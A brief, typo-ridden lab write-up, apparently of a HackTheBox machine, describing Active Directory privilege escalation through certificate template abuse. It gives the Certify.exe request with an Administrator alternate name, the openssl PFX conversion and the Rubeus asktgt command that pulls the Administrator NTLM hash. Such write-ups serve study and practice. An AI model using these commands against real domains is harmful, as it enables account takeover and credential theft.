inital foothold has easy so not explaining it

the priv esc was different

bloodhound said something about spn tickets

so, we did certify.exe to get certificate first and then rubesu sto get ntlm hash of admin

the template was already there

```
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

openssl pkcs12 -in cert.pem -inkey private.key -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

convertinf both of the keys in pfk then upload it to server

.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
```
